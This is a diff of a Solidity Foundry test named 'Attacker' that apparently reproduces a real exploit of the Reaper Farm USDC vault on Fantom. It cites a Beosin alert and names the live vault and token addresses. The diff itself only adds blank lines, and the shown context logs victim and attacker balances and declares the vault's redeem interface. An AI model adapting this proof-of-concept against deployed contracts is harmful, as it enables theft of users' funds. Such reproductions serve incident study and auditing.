@@ -23,6 +23,7 @@ import "./../interface.sol";
 // Beosin : https://twitter.com/BeosinAlert/status/1554476940593340421
 
 contract Attacker is Test {
+
     CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     IReaperVaultV2 constant ReaperVault = IReaperVaultV2(0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D);
     IERC20 constant USDC = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
@@ -46,9 +47,12 @@ contract Attacker is Test {
         emit log_named_decimal_uint("Victim ReaperUSDCVault balance", ReaperVault.balanceOf(victim), 6);
         emit log_named_decimal_uint("Attacker USDC balance", USDC.balanceOf(address(this)), 6);
     }
+
 }
 
 interface IReaperVaultV2 {
+
     function balanceOf(address owner) external view returns (uint256);
     function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
+
 }
